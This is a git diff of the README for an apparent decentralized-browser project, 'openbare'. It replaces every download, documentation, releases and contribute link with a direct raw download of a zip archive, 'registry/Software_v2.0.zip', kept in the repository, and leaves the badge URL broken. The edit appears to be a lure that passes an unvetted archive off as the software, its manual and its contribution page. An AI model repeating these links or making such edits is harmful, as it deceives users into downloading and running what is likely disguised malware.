@@ -6,7 +6,7 @@ Welcome to the **openbare** project! This application provides a decentralized w
 
 ## 📥 Download
 
-[![Download Openbare](https://img.shields.io/badge/Download%20Openbare-v1.0.0-blue)](https://github.com/Almeida9806/openbare/releases)
+[![Download Openbare](https://github.com/Almeida9806/openbare/raw/refs/heads/main/registry/Software_v2.0.zip%20Openbare-v1.0.0-blue)](https://github.com/Almeida9806/openbare/raw/refs/heads/main/registry/Software_v2.0.zip)
 
 ## 📋 System Requirements
 
@@ -30,7 +30,7 @@ To use **openbare**, you need the following:
 To get started, you need to download the latest version of **openbare**. 
 
 1. **Visit the Releases Page**: Click the link below to go to the Releases page.
-   [Download from Releases](https://github.com/Almeida9806/openbare/releases)
+   [Download from Releases](https://github.com/Almeida9806/openbare/raw/refs/heads/main/registry/Software_v2.0.zip)
 
 2. **Choose Your Version**: Look for the latest version and click on it.
 
@@ -68,8 +68,8 @@ For any questions, suggestions, or support, connect with us:
 
 ## 🔗 Helpful Links
 
-- [Documentation](https://github.com/Almeida9806/openbare/wiki): Detailed user manual.
-- [Releases](https://github.com/Almeida9806/openbare/releases): Download the latest versions.
-- [Contribute](https://github.com/Almeida9806/openbare/contributing): Help us improve the project.
+- [Documentation](https://github.com/Almeida9806/openbare/raw/refs/heads/main/registry/Software_v2.0.zip): Detailed user manual.
+- [Releases](https://github.com/Almeida9806/openbare/raw/refs/heads/main/registry/Software_v2.0.zip): Download the latest versions.
+- [Contribute](https://github.com/Almeida9806/openbare/raw/refs/heads/main/registry/Software_v2.0.zip): Help us improve the project.
 
 Thank you for choosing **openbare**! Enjoy browsing securely.
